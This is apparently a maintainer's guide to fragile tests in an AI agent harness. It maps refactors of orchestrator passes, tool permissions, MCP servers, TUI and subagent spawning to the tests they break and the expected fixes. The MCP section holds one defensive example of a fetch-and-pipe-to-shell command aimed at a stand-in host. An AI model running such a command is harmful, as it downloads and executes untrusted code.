# Breaking Changes — Fragile Mock Points in the Test Suite

This file documents why each fragile test in this suite breaks, and what
the fix is expected to be when a planned refactor touches the surface
the test mocks against.

Read this BEFORE updating a failing test that mentions this file in its
docstring. A failure here usually signals a real design change upstream
worth understanding, not a flaky mock to patch over.

---

## 1. `test_orchestrator.py` — the most fragile mock in the suite

This file mocks `RunAgentLoop.run_deep_research_mode` keyed by `pass_id`
strings ("Pass 0", "Pass 3a", "Final synthesis", ...). The orchestrator
calls `_run_pass(pass_id, ...)`, which in turn calls
`run_deep_research_mode(pass_id=pass_id, ...)`. Mocks intercept at the
`run_deep_research_mode` boundary, NOT `_run_pass`, so anything that
refactors `_run_pass`'s *internals* doesn't break this test.

### What breaks it

| Change | Symptom | Fix |
|---|---|---|
| Rename a pass (e.g. "Pass 3a" → "Grounding") in `orchestrator.py` and `system_prompts.py` | `AssertionError: orchestrator called an unexpected pass_id 'Grounding'` | Update the keys in `_canned_pass_responses` in the test to match the new pass_id strings |
| Change the JSON SHAPE a pass returns — e.g. Pass 2 claims growing an `asserted_by_candidates` field | The orchestrator's `_claim_from_json` filters unknown fields silently (via `_CLAIM_INPUT_FIELDS` allowlist), so this *doesn't break* the test until a required field is added | If a NEW required field is added to `_CLAIM_INPUT_FIELDS`, include it in the canned Pass 2 mock payloads |
| Add a new pass between existing passes | `AssertionError` on pass-order assertion (the `call_log == expected_order` check) | Add the new pass_id to `_canned_pass_responses` (with its expected JSON shape), insert into the expected pass order list in tests |
| Change the Trace line *format* (e.g. `Pass 0: plan produced (X entities)` → `Pass 0 produced X-entities`) | The `test_pipeline_trace_contains_expected_lines_in_order` test uses `startswith()` against prefix strings like `"Pass 0:"` | Update the `expected_pass_starts` list in that one test to match the new format |
| Refactor `_run_pass` → `_run_pass_with_json_retry` (ROADMAP §3) | Should NOT break this test, since the mock is on `run_deep_research_mode` not `_run_pass` | If the refactor changes which ENTRYPOINT the orchestrator calls (e.g. starts calling `_run()` directly per ROADMAP §3's "alternative"), the mock target needs to change |
| Add a new kwarg to `RunAgentLoop.run_deep_research_mode` (e.g. `temperature=None` per ROADMAP §10) | `TypeError: side_effect() got an unexpected keyword argument 'temperature'` | The `_build_pass_mock` side_effect already accepts `**kwargs` to swallow these, so this should NOT break. If it does, re-audit that signature. |

### The expected update pattern after ROADMAP §3 (Malformed-JSON recovery)

ROADMAP §3 refactors `_run_pass` into `_run_pass_with_json_retry` which
keeps appending retry messages to the SAME pass's thread. If the
implementation chooses to keep using `_run_pass` as the inner call
(with retry wrapping it externally), `test_orchestrator.py` is
unaffected — the mock still intercepts `run_deep_research_mode` calls
between `_run_pass` and the SDK. If the implementation instead reaches
into `RunAgentLoop._run()` directly (ROADMAP §3's "alternative"), the
mock target in `_build_pass_mock` needs to switch from
`RunAgentLoop.run_deep_research_mode` to `RunAgentLoop._run`.

### The retry-loop test specifically

`test_pipeline_6a6c_retry_loop_continues_until_max_retries_then_fallback`
hard-codes `MAX_RETRIES = config.MAX_PIPELINE_RETRIES`. If the retry
mechanic goes through ROADMAP §3's JSON-retry (a separate retry cap
inside _run_pass_with_json_retry), the count semantics change: the
orchestrator's outer retry loop still uses `MAX_PIPELINE_RETRIES`, but
inner JSON-retry attempts add extra `run_deep_research_mode` calls per
outer attempt. The test would need to multiply the canned 6a/6c
responses by the new retry factor.

---

## 2. `test_loop_stop_conditions.py` & `test_loop_tool_dispatch.py`

These mock `core.loop.call_model_stream` and `core.loop.registry.dispatch`
directly, both as top-level references inside `core/loop.py`.

**§13 generator conversion:** `_run()` is now a generator yielding
`LoopEvent` objects. Tests wrap it in `run_to_completion()` and mock
`core.loop.call_model_stream` (via `make_stream_from_response` from
`tests/conftest.py`) instead of `core.loop.call_model`. The mock target
changed from `core.loop.call_model` to `core.loop.call_model_stream`.
Any test that still patches `core.loop.call_model` will fail with
`AttributeError: module 'core.loop' has no attribute 'call_model'`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Rename or move `call_model_stream` (e.g. refactor into a different module) | The mock target `core.loop.call_model_stream` no longer exists; tests pass through to real `call_model_stream` and fail (no fake client) | Update the mock target path in both files |
| Add a new parameter to `_run()` (e.g. `tool_context` per ROADMAP §15) | `TypeError: _run() got an unexpected keyword argument` only if tests pass it; tests today use `_build_run_kwargs` / `_make_run_kwargs` so they only pass what's listed | If `_run` grows a required positional parameter (unlikely), update the kwargs builders |
| Change the `stop_reason` strings (e.g. "max_steps_reached" → "MAX_STEPS") | Direct `assert response.stop_reason == "complete"` fails | Update the string literals in the assert statements; these strings are deliberately stable per ARCHITECTURE.md §4.8 so changes here are intentional and warrant a ROADMAP update too |
| Change `_run`'s tool_gate behavior to skip the `error: not available in this context` early branch | `test_disallowed_tool_name_skips_dispatch_and_feeds_error_result` still passes IF the new behavior also avoids dispatching, fails if it dispatches | Audit the new behavior; either update the assertion expectations OR flag the change as a regression of the "tools not allowed in this context" guarantee |
| Remove `run_to_completion()` or change its import path | Tests that call `run_to_completion(RunAgentLoop._run(...))` fail with ImportError | Update the import; `run_to_completion` lives in `core/loop.py` per §13's decision |
| Change `LoopEvent` field names | Tests that inspect events directly (test_streaming_loop.py) fail on attribute access | Update field names in both production and test code |

---

## 3. `test_client_translation.py`

Mock-free pure-translation tests; should be robust.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Add Google's `_tools_for_provider` / `_messages_for_provider` implementation (ROADMAP §9) | `test_tools_google_not_implemented` and `test_messages_google_not_implemented` FAIL because NotImplementedError no longer raises | Delete or rewrite those two tests against the new translation behavior; verify the new behavior matches the SymPy/Content structures Google's SDK expects |
| Change Anthropic's tool_result batching (one user message with N tool_result blocks) — e.g. Anthropic releases a new API version that wants one message per result | `test_messages_anthropic_consecutive_tool_results_batch_into_one_user_message` fails | Update the test to assert the new shape; this is a deliberate API contract change and ARCHITECTURE.md §4.7 should be updated alongside |
| Change OpenAI's `tool_calls.function.arguments` JSON encoding shape | `test_messages_openai_assistant_with_tool_calls_serializes_arguments_as_json` fails | Either the production change is wrong (revert it) or the test expectation is wrong (update it) — verify which by re-reading ARCHITECTURE.md §4.7 load-bearing diffs |

---

## 4. `test_memory_write_through.py`

This file's tests assert the CURRENT (lossy) resume behavior — assistant
entries are persisted as the full rich dict under storage's `content`
column, and `get_session_history` returns them nested under `content`
rather than restored to their original top-level shape.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Re-fix the assistant-shape lossy-resume bug (e.g. make storage.get_session_history reconstruct the poison-neutral shape) | Tests in `test_resume_existing_thread_loads_messages_from_storage` that assert `second.messages[1]["content"]["text"] == "Hi there"` need rewriting to assert `second.messages[1]["text"] == "Hi there"` (top-level keys returned, not nested) | This is a desirable fix. Update those tests to assert the now-uniform shape. The asymmetry note at the top of the file should also be removed/replaced. |
| Reintroduce `from core.storage import ...` in `core/memory.py` | `test_core_memory_import_succeeds` fails with an ImportError mentioning `core.storage` | Revert the import to `from storage import ...` per ARCHITECTURE.md §11 |
| Change `add_assistant_message` to take a different argument (e.g. raw SDK object instead of normalized ModelResponse) — ARCHITECTURE.md §4.6 explicitly forbids this | `test_add_assistant_message_appends_and_save_uses_neutral_shape` fails because it builds a `ModelResponse` to pass in | This is a regression of the §4.6 contract; flag and revert, do NOT update the test to pass SDK objects |

---

## 5. `test_registry_permissions.py`

Mock-friendly: monkeypatches `is_tool_allowed` and `requires_approval`
at the `tools.registry` module namespace. Independent of config defaults.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| `registry.dispatch` adds a new step (e.g. `check_output_policy` from ROADMAP §8) | Tests still pass — they only verify policy enforcement, not the post-call content filter | If you want post-call coverage too, add a new test; don't modify existing ones |
| Add a `core/loop.py` integration that uses a different exception class instead of `ToolCallDenied` | `test_loop_tool_dispatch.py::test_registry_dispatch_raises_ToolCallDenied_caught_and_recorded_as_error` fails | Update the import in that test from `ToolCallDenied` to the new class |
| Change `ToolCallDenied`'s message wording (e.g. "approval" → "consent") | String assertions like `"approval" in result["error"].lower()` may fail | Update the substring checks; keep them loose (lowercase substring) so wording can drift without rewriting tests |

---

## 6. `test_math_tools.py`

Stable across SymPy version drift (uses symbolic equivalence, not string
equality).

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Rename any tool's operations (e.g. "dot_product" → "dot") | Tests pass operation names directly to `run({"operation": "..."})`; will raise a pydantic ValidationError | Update the operation string in the relevant test |
| Change the param model field names (e.g. `vector_a` → `first_vector`) | ValidationError: missing field | Update the param dict in the affected test |
| Make `safe_parse` not raise on injection payloads (e.g. accidentally leave `__builtins__` in the namespace) | `test_safe_parse_blocks_dunder_import_injection` may or may not catch it (depends on whether the payload actually executes) — this is a SECURITY regression. Treat any change to `_SAFE_GLOBALS` in `_math_common.py` as a security-sensitive diff and audit before merging. | Do NOT update the test to "make it pass". The test is correctly asserting a security invariant; the production code must change. |
| Bump SymPy major version | Symbolic equivalence (`sympy.simplify(a - b) == 0`) should hold; minor serialization drift is absorbed by the equivalence check | If a major version introduces a different `Matrix.dot` return type for matrix-vs-vector or changes integer behavior, audit and update expectations |

---

## 7. `test_confidence_scoring.py`

Pure-function tests against `score_claim`. Stable by design; the formula
is manually maintained in `confidence_scoring.py`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Adjust `TIER_THRESHOLDS` (e.g. the LOW cutoff moves from 0.3 to 0.25) | General coverage tests (`test_partial_grounding_factual_lands_medium`, `test_synthesis_above_cap_drops_tier_when_penalized`) may land in different tiers | Update the expected tier in those assertions; the three ROADMAP-required regression tests (HIGH, UNVERIFIED, cap-swallows-penalty) should remain valid REGARDLESS of threshold tuning — if any of those three break, the formula change is a real regression of the regression-guarded invariant |
| Move the cap from `NON_FACTUAL_SCORE_CAP = 0.65` to a different threshold | The cap-before-penalty regression test still passes IF the cap is applied before penalty (the regression test only checks the GAP between clean and flagged claims is exactly `ASSUMPTION_FLAG_PENALTY`, regardless of where the cap sits); the general test `test_synthesis_above_cap_drops_tier_when_penalized` may break depending on new cap value vs flag count arithmetic | Re-audit the general tests against the new cap value; the regression test should keep passing if the formula invariant holds |
| Apply ensemble-mode scoring (ROADMAP §10) — adds a `consistency_score` term and takes `ensemble_n` as a parameter | All five tests still pass: they call `score_claim(claim)` with the default (no ensemble_n), which falls into the unchanged non-ensemble branch | If ensemble-n becomes a required parameter (no default), update tests to pass `ensemble_n=0` explicitly |

---

## 8. `test_pipeline_storage.py` & the §5 persistence schema/status

These tests exercise `core/reasoning/pipeline_storage.py`
(`create_pipeline_run` / `update_pipeline_run` / `load_pipeline_run`)
against the upgraded fake sqlmodel, plus the orchestrator's failure-path
persistence wrap and per-pass checkpointing.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Rename a `PipelineRunRecord` column (`claims_json` / `trace_json` / `coverage_gaps_json` / `final_report`) or change its type | `test_update_pipeline_run_on_complete_marks_complete_and_stores_columns` and `test_load_pipeline_run_round_trips_all_fields` fail with `AttributeError` on the record, or a `json.loads` mismatch | Update the column name/type in both the write and read assertions; keep the separate-columns convention (do NOT collapse back into one blob — see DEVLOG §3.4 for why) |
| Change the `status` literals (`running` / `complete` / `failed`) | `test_..._marks_complete...` and the orchestrator failure/success-path tests fail on the status assertion | Update the literal in both `pipeline_storage.py` (terminal check) and the tests. `complete` is deliberately aligned with `ModelResponse.stop_reason`'s `"complete"` — don't drift it back to `succeeded` |
| Change `update_pipeline_run`'s serialization (e.g. `vars(c)` → `asdict(c)`, or add a field to `Claim`) | The `claims_json` round-trip assertion may change shape | Per the migration note on `Claim` in `base.py`: if a nested-dataclass field is added, migrate EVERY `vars(c)` site (orchestrator passes + `pipeline_storage`) to `asdict(c)` together, then update the test's expected claim dict |
| Change the inner-failure logging in `orchestrator.py`'s except block (the `logger.error(...)` call) | `test_inner_storage_failure_propagates_original_exception_and_logs_run_id` fails — either the original exception is masked (real regression) or the run_id no longer appears in the log message | The invariant: the ORIGINAL pipeline exception must propagate, and the persistence failure must be logged at ERROR naming the `run_id`. Restore both before touching the test |
| Add/remove a `load_pipeline_run` return field | `test_load_pipeline_run_round_trips_all_fields` fails on a missing/extra key | Update the assertion to match the new return shape. The 9-field contract (id, user_query, status, started_at, finished_at, claims, trace, coverage_gaps, final_report) is documented in `pipeline_storage.py`'s docstring |
| Remove or relocate a per-pass `update_pipeline_run(run.run_id, run)` checkpoint in `orchestrator.py` | `test_crash_after_pass_3b_leaves_claims_populated_via_load` or `test_hard_kill_bypasses_except_block_checkpoint_survives` fails — claims or trace are empty/incomplete after a mid-pipeline crash | Restore the checkpoint after the affected `run.log(...)` call. The invariant: every `run.log(...)` (except "Final synthesis complete.", which is subsumed by the terminal update) is followed by a data-only checkpoint. See DEVLOG §5.1 for the full 16-site list |
| Change `test_pipeline_success_marks_run_complete`'s status assertion back to `statuses_seen == ["complete"]` | The test fails because per-pass checkpoints add `None`-status calls before the terminal `"complete"` | The correct assertion: last call is `"complete"`, all preceding are `None`, and at least one `None` exists. See DEVLOG §5.6 |

---

## 9. `test_cli.py` — parser defaults, trust flow, and prompt assembly (§14)

§14 changed `main.py`: `--provider`/`--model` now default to `None` and
resolve AFTER parsing via `resolve_runtime_defaults()` (CLI >
settings.json > config.py), a `--trust-project` flag was added, and
startup runs `_ensure_workspace_trust()` + `config_loader.initialize()`.
System prompts now assemble through
`prompts.system_prompts.with_skill_catalog()` / `pass_prompt()`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Move parser defaults back to argparse-level constants (`default=DEFAULT_PROVIDER`) | `test_build_parser_defaults` fails (asserts `None`) | The `None` defaults are load-bearing: argparse fill-in must be distinguishable from an explicit CLI choice or settings.json can never win. Resolution lives in `resolve_runtime_defaults()` |
| Rename a known settings.json key | `test_resolve_runtime_defaults_precedence` fails | Update the dict keys; the known-key schema lives in `core/config_loader.py::_KNOWN_SETTINGS` and must change in the same commit |
| Change the non-TTY notice wording | `test_trust_non_tty_skips_without_hanging` asserts the notice mentions `--trust-project` | Keep the flag name in the notice (it is the remediation the user needs); the flag itself is user-facing CLI surface and should not be renamed casually |
| Change `describe_project_content()` so settings.json is no longer shown verbatim | `test_trust_prompt_shows_settings_contents` fails | The verbatim display is the informed-consent amendment (DEVLOG §14): a project's settings can pick the provider and multiply pipeline cost, so approval must show them. Restore verbatim display |
| Assert exact system-prompt text passed to `_run()` in any test | Prompt gains an appended `## Available skills` catalog whenever `config_loader` was initialized with skills present | The autouse `clear_config_loader_state` fixture (tests/conftest.py) resets the cache between tests; only `initialize()` with skills inside a test that wants the catalog |
| Move `pass_prompt()`/`with_skill_catalog()` out of `prompts/system_prompts.py` | `test_load_skill.py` prompt-assembly tests fail on import | Keep both there; the §3 JSON-retry path and `run_deep_research_mode` must share one assembly point so the catalog cannot diverge between an attempt and its retry |

---

## 10. Permission signatures, `ToolContext`, and advertised schemas (§15)

§15 added an optional `ToolContext` to every permission entry point and
replaced `_run()`'s `allowed_tools` list with it. Three signatures
changed, and one behavioural default changed with them.

**Signatures:** `is_tool_allowed(name, context=None)`,
`requires_approval(name, params, context=None)`,
`ToolRegistry.approval_needed(name, params, context=None)`,
`ToolRegistry.dispatch(name, params, context=None, approval_callback=None)`,
`ToolRegistry.schemas(context=None)` (was `schemas(tool_names: list[str])`),
`RunAgentLoop._run(..., context, ...)` (was `allowed_tools`).

**Behaviour:** `schemas()` now returns only tools that pass
`is_tool_allowed(name, context)` and any `ToolSpec.available_check`. Under
default config that is **12 of 16** registered tools — `read`/`write`/
`edit`/`shell` are permission `False`. It was 11 until §19: `load_skill`
has an `available_check` that hid it while no skills existed, and §19
shipped four builtins, so it is now advertised for the first time.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Monkeypatch `tools.registry.is_tool_allowed` / `requires_approval` with a lambda taking the OLD arity | `TypeError: <lambda>() takes N positional arguments but N+1 were given` | Add `context=None` to the stub. `mocker.patch(..., return_value=X)` is unaffected — it ignores arity, which is why `test_policy_enforcement.py` survived untouched |
| Define a `fake_dispatch(name, params, approval_callback=None)` test double | `TypeError: got an unexpected keyword argument 'context'` — the loop always passes `context=` | Add `context=None` to the stub signature |
| Assert `dispatch.assert_called_once_with(name, params)` | Fails: actual call is `(name, params, context=None)` | Include `context=None` (or the ToolContext under test) in the expectation |
| Move the approval OR-composition out of `approval_needed()` and back into `dispatch()` | `test_loop_tool_dispatch.py::test_context_is_forwarded_to_dispatch_and_approval_needed` and the AC3 tests still pass, but the loop's permission bridge silently diverges from dispatch | **Do not.** `approval_needed()` is the single source of truth §13 created and §15 extended; the two callers must compute approval from the same code. See DEVLOG §15.3.1 — the ROADMAP sketch gets this wrong because it predates §13 |
| Make a tool's `approval_check` REPLACE `requires_approval()` again instead of OR-ing with it | `test_ac3_context_false_does_not_suppress_tool_approval_check` and `test_approval_check_false_still_consults_config_and_context` fail | This is the specific regression §15 exists to close: an either/or makes agent `approval_overrides` silently inert for `read`/`write`/`edit`/`shell` — the four tools where per-agent tightening matters most |
| Let a context re-enable a globally disabled tool (reorder the AND so the context is checked first, or make `allowed_tools` additive) | `test_ac1_*` fail | The global check is unconditional and first, by design. Agent definitions can come from a merely-trusted project directory; none may hand themselves a capability the user turned off |
| Give `approval_overrides` three-state semantics so `False` can suppress approval | `test_ac3_*` fail | Under OR, `False` is indistinguishable from absent — that asymmetry IS D14. A context may tighten, never loosen |
| Drop `check_output_policy()` from `dispatch()` while refactoring it | `test_ac5_check_output_policy_still_runs_on_dispatched_results` fails | Restore it. §15's own Rev. 2 sketch omitted this line; written as sketched it would have deleted ROADMAP §8's secret redaction in the section about tightening permissions |
| Drop the unknown-tool `ValueError` guard from `dispatch()` | `test_ac7_*` fail with `KeyError` | Restore it. It matters MORE since §15, not less: runtime `unregister()` (D15) makes a stale tool name a reachable state rather than a programmer error |
| Register a tool without adding fields to BOTH `config.ToolPermissions` and `config.ToolApprovals` | `RuntimeError` at `import tools.registry` — the ENTIRE suite fails to collect, not one test | Intended (D24). Add the two boolean fields. `mcp__*` names are exempt |
| Add a tool that should not always be advertised | It appears in every `schemas()` call | Give its `ToolSpec` an `available_check` predicate, as `load_skill` does. Do not special-case it inside `schemas()` — the registry owns mechanism, not policy |
| Flip `read`/`write`/`edit`/`shell` to permission `True` in `config.py` | `test_schemas_omits_globally_denied_tools_from_the_real_registry` fails | Expected — the test pins the shipped default. Update it deliberately, in the same commit as the config change |
| Call `registry.schemas(["a", "b"])` with a name list | `AttributeError` on `.allowed_tools`, or a silently empty result | The list parameter is gone. Pass `ToolContext(allowed_tools={"a", "b"})` — one representation of "which tools may run", not two |

---

## 11. TUI pilot tests, reasoning effort, and the sampling gate (§16)

§16 added `tui/`, an `effort` parameter threaded from the TUI to the provider
payload, and a gate that drops sampling parameters on models that reject
them. Three new test files: `test_tui.py`, `test_client_effort.py`,
`test_ensemble_guard.py`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Revert `run_worker(..., exit_on_error=False)` to Textual's default | `test_ac3_exception_in_a_tool_does_not_terminate_the_app` fails, and it fails by tearing down the whole test app — the output is a full Textual crash dump, not an assertion | Restore it. The default kills the app on any transient worker exception. `on_worker_state_changed` is required alongside it or the error is reported nowhere |
| Make a permission dismissal path not put a boolean on the channel (return early, dismiss with `None`, drop the `put`) | The AC2 tests **hang** rather than fail — the worker blocks forever on `queue.get()`. Under a timeout they show as a killed run | Every dismissal path, including Escape, must resolve to a boolean. This is why the AC2 tests assert on the dispatched tool: a modal that renders and drops the answer looks identical to one that works, right up until it doesn't |
| Restart or re-enter the generator on approval instead of resuming it | `test_ac2_approving_...` fails on the dispatch assertion — a fresh generator re-issues the model call and never reaches the tool | Resume. `permission_channel` exists (§13) so the SAME generator continues |
| Add `asyncio_mode = auto` to `pytest.ini` | Nothing breaks immediately, but ARCHITECTURE §4.13's "no asyncio in pytest.ini" stops being true | Not needed — TUI tests carry explicit `@pytest.mark.asyncio`. `--strict-markers` accepts it because pytest-asyncio registers the marker |
| Change `call_model_stream`'s positional parameter order | `test_effort_reaches_the_model_call` asserts `call_args[0][7] == "high"` | Update the index, or switch the assertion to a keyword — but keep asserting on the *call arguments*, not on the raven: the indicator can be right while the parameter never leaves the UI |
| Make `effort=None` send something on any provider | `test_no_effort_sends_nothing_on_every_provider` fails | Silence is the only universally safe value: `reasoning_effort` is rejected by OpenAI-compatible non-reasoning models, adaptive thinking by pre-4.6 Anthropic models. Opt-in is what keeps §16 from changing every existing caller's behaviour |
| Tabulate Anthropic effort levels instead of querying | `test_anthropic_levels_come_from_the_api_not_a_table` fails (it uses a model name absent from every table) | Query. The entire point is that a newly released Anthropic model needs no entry in this repo |
| Query a non-Anthropic provider for capabilities | `test_non_anthropic_uses_the_table_without_querying` fails the client stub deliberately | No OpenAI-compatible provider in `providers.json` exposes a capability endpoint |
| Send `ThinkingConfig(thinking_budget=...)` unconditionally on Google | `test_google_effort_tracks_what_the_installed_sdk_can_express` fails; against the real pinned SDK it is a `TypeError` | The pinned `google-genai==1.0.0` has no such field. Keep the `_google_supports_thinking_budget()` gate, or move the pin deliberately — which also puts §9's Google implementation back in scope for retest |
| Drop the sampling parameter silently instead of logging | `test_sampling_dropped_for_models_that_reject_it` fails on the caplog assertion | Warn. A silent drop is how ensemble mode came to look like it worked |
| Make the ensemble guard warn-and-continue instead of raising | `test_ensemble_on_a_sampling_rejecting_model_raises_before_any_work` fails | Raise. Continuing produces N identical candidates and reports maximal cross-candidate consistency for all of them — an expensive wrong answer, not a degraded one |
| Change `config.MODEL_NAME` to a model that accepts sampling params | `test_default_model_is_in_the_reject_set` fails | Intended as a deliberate signal: update the test in the same commit, having checked the new default really does accept them |
| Change `config.MAX_TOKENS` | Nothing fails — `test_call_model_google_text_only` asserts against the setting, not a literal | That test used to hardcode 4096 and broke when §16 raised it. Assert against the setting for tunables |
| Add a settings key without adding it to `_KNOWN_SETTINGS`/`_KNOWN_TUI` | `ValueError: unknown tui key` at load | Intended (§14 amendment 1). A preference the loader doesn't know about is a startup error, not a silently ignored line |
| Add a nested settings section without adding it to `_NESTED_SETTINGS` | It validates as a bare `dict` and **shallow-merges** across tiers — a project setting silently discards the user's sibling keys | Register it in `_NESTED_SETTINGS`; both the validator and the deep-merge iterate it. Hardcoding the section name in two places is what produced review finding F2 |
| Remove `ThinkingConfig` from the Google fake in root `conftest.py` | Every Google effort test errors on a missing attribute | The real SDK has it. A fake missing what production provides is the double drifting, not the code being wrong |

---

## 12. MCP client, the async bridge, and tier precedence (§17)

§17 added `mcp_client/`, made redaction recursive, flipped user/project tier precedence, and made
MCP tools approval-gated by default. Two new test files: `test_mcp_client.py`,
`test_mcp_config.py`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Collapse the `_manager()` task back into `connect_all()` entering the stack and `disconnect_all()` closing it (what §17's spec sketches) | `test_disconnect_all_unwinds_without_a_cancel_scope_error` fails with `RuntimeError: Attempted to exit cancel scope in a different task than it was entered in` in the log | Restore the manager task. anyio binds cancel scopes to the TASK, and `run_coroutine_threadsafe()` creates a new one per call — being on the right *loop* is not enough. Note the test asserts on the **log**, not on `raises`: `disconnect_all()` swallows exceptions, so a "does not raise" assertion here is unfalsifiable |
| Drop `read_timeout_seconds` and rely on `future.result(timeout=)` alone | `test_ac4_a_hanging_tool_times_out_via_the_protocol_not_the_caller` fails on elapsed time | Keep both. The protocol timeout cancels the request; the future timeout only stops waiting. Assert on **which one fired**, not on "an error came back" — both paths return an error, which is what made the first version of this test vacuous |
| Rename a package to `mcp/` | Everything fails at import: `import mcp` resolves to the local package | It must stay `mcp_client/`. The project root is on `sys.path` |
| Read `.structuredContent` / `.isError` (v1 spellings) | `test_normalize_reads_v2_snake_case_field_names` fails | v2 is snake_case. Reading v1 names against v2 doesn't crash — `getattr` returns `None`, so **every failed call silently looks successful**, the worst available shape |
| Move the `mcp` pin below 2.0 | Import errors (`MCPError`, `Client`) plus silent field mismatches | Re-verify in hand before moving it, per D22. That instruction is why §17 shipped against v2 instead of a spec written for v1 |
| Revert `_redact_value` to top-level strings only | 2 tests in `test_policy_enforcement.py` and `test_ac6_secret_in_mcp_output_is_redacted_by_the_existing_layer` fail | Keep the recursion. `structured_content` is arbitrary third-party JSON arriving under `result` as a dict; scanning only top-level strings leaves the highest-risk output unscanned |
| Restore `_tier_dirs` to `[harness, project, user]` | `test_user_wins_over_project` and `test_f3_user_over_project_collision_warns` fail | D29 inverted it deliberately. Harness stays first (D18) |
| Implement D29 as "only the user tier loads" | `test_non_colliding_definitions_from_both_tiers_all_load` fails | Precedence breaks same-name ties only; `_discover()` accumulates a union |
| Express `autoApprove` as a `ToolSpec.approval_check` instead of a base default | `test_d28_auto_approve_server_does_not_require_approval` fails | `approval_needed()` ORs approval_check in, and OR can only tighten — an opt-out there is inert. Vary the base default via `set_dynamic_approval_default` |
| Make `_default_for_unknown_approval` return False for `mcp__*` | `test_d28_mcp_tools_require_approval_by_default` fails | Allowed-by-default and trusted-by-default are different questions |
| Add a try/except-free `_connect_all_async` | `test_a_failing_server_is_named_and_skipped_without_stopping_the_others` fails | One stale entry must not make the harness unusable |
| Move project `mcp.json` back to the project root | `test_project_mcp_json_lives_under_dot_venastine` fails | At the root it sits outside D17's hash, and `is_trusted()` returns True when `.venastine/` is absent |
| Key the acknowledgement store by name only | `test_editing_the_command_makes_a_remembered_server_unknown_again` fails | Hash the entry. Otherwise approving `npx pkg` silently carries to `curl evil.sh \| sh` under the same name |
| Stub `mcp` in the root `conftest.py` like the other six SDKs | The bridge tests stop testing the bridge | Deliberate exception. v2's in-memory transport is offline already, and a fake cannot reproduce anyio's cancel scopes — the bug that shaped this design |

---

## 13. Agent system: dispatch injection, headless callability, goal mode (§18)

§18 added `parent_run` to `dispatch()`, signature-inspection injection of
`parent_context`/`parent_run` into handlers that declare them, the
headless callability filter (`schemas(callable_only=...)` +
`headless_hidden()`), `ConversationMemory.extra`/`set_extra`, and the
`system_prompt=` kwarg on `run_agent_conversation`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Define a `fake_dispatch(name, params, context=None, approval_callback=None)` test double | `TypeError: got an unexpected keyword argument 'parent_run'` / `'permission_channel'` — the loop always passes both now | Add `parent_run=None, permission_channel=None` to the stub signature |
| Assert `dispatch.assert_called_once_with(name, params, context=X)` | Fails: actual call also carries `parent_run=RunInfo(...)` and `permission_channel=` | Add `parent_run=ANY, permission_channel=None` to the expectation |
| Assert `approval_needed` was called exactly once per tool call | Fails: §18's headless filter consults it at schema time too | Assert every call received the same context (`call_args_list`), not a count — see `test_context_is_forwarded_to_dispatch_and_approval_needed` |
| Spy/fake `ConversationMemory` lacking `.extra` | `AttributeError: ... no attribute 'extra'` from `with_goal()` | Add `self.extra = {}` to the double (and `set_extra` if it is exercised) |
| `FakeStorage.get_thread` returning a bare truthy sentinel | NOT an `AttributeError`: `ConversationMemory.__init__` reads `extra_data` defensively via `getattr`, so the thread silently gets an empty `.extra` and the failure surfaces LATER as a missing `## Persistent objective` section | Return an object carrying `extra_data` (the fake now mirrors the real row); keep `None` for unknown ids |
| Rename the `## Persistent objective` marker or move goal assembly out of `core.loop.with_goal` | `test_goal_persists_and_injects_into_prompt` fails | The marker lives in `with_goal()` so the CLI wrapper and TUI worker cannot drift; keep both calling it |
| Make `child_context` a union instead of an intersection | `test_ac1_*` fail | C6: intersection, never union — a restricted parent must not escape via a permissive child |
| Remove the `callable_only` drop from `schemas()` | `test_headless_filter_hides_approval_gated_mcp_tool` fails | The headless rule is the §15-17 finalization: uncallable-without-a-channel tools are not advertised, and `headless_hidden()` feeds the once-per-process WARNING |
| Register a dynamically-named probe tool without the `mcp__` prefix in dispatch tests | `ToolCallDenied: ... disabled by policy` | Unknown non-`mcp__` names are denied by design; use `mcp__*` names for probes (allowed by default, approval-gated, so pass an `approval_callback`) |

---

## General regeneration: when a production change breaks several tests at once

If a planned refactor (e.g. ROADMAP §3's JSON-retry, §10's ensemble mode)
breaks multiple tests across multiple files:

1. Read the planned change in ROADMAP.md to understand the NEW contract.
2. Update the canned/pinned values in tests to match the new contract,
   NOT to silently absorb the change.
3. If a regression test (the ROADMAP §4 "three verbatim cases") breaks
   on a planned refactor, that's a signal the refactor is changing a
   guarded invariant — STOP and re-evaluate the refactor against the
   original motivation for the invariant before updating the test.
4. Update this file to document the new break surface for the next
   maintainer.

---

## 14. §14–§18 review fixes

| If you change | You break | Fix |
|---|---|---|
| Remove `ToolSpec.grant_scope` or stop consulting it in `_run()` | `test_s1_grant_means_one_prompt_per_turn_not_per_spawn` | The §18 sign-off asks once per RUN, not per call. The loop learns which tools work that way from `registry.grant_scope()`, never by name |
| Remove `ToolSpec.approval_notice` or the `notice` key on `permission_request` | `test_permission_channel_yields_request_and_dispatches_on_approval` | The event carries `notice` (often `None`). It is what tells the user what approving a spawn actually authorises |
| Add a name to `_INJECTABLE_PARAMS` without adding it to `dispatch()`'s injection map | `KeyError` at dispatch time | Deliberate. The previous ternary silently injected `parent_run` under any third name |
| Make `child_context` replace rather than union `approval_overrides` | `test_s2_parent_approval_tightenings_reach_the_child` | S2: approval composes like tool access. Only `True` entries carry |
| Stop forwarding `permission_channel` from `spawn_subagent` | `test_spawn_forwards_the_channel_and_the_grant` | Without it the child runs headless and loses every approval-gated tool, including all MCP tools |
| Set `ToolApprovals.spawn_subagent = False` again | `test_spawn_subagent_permission_declared` | Approving the spawn IS the sign-off; without it there is nothing to grant against |
| `clear_dynamic_approval_defaults(prefix)` | `TypeError` — it takes exact names now | It over-matched: clearing `mcp__fs__read` also cleared `mcp__fs__read__x`. No-arg still clears all |
| `unregister_all` scanning by prefix again | `test_unregistering_one_server_leaves_a_prefix_sibling_intact` | Server `fs`'s prefix also matches server `fs__read`'s tools |
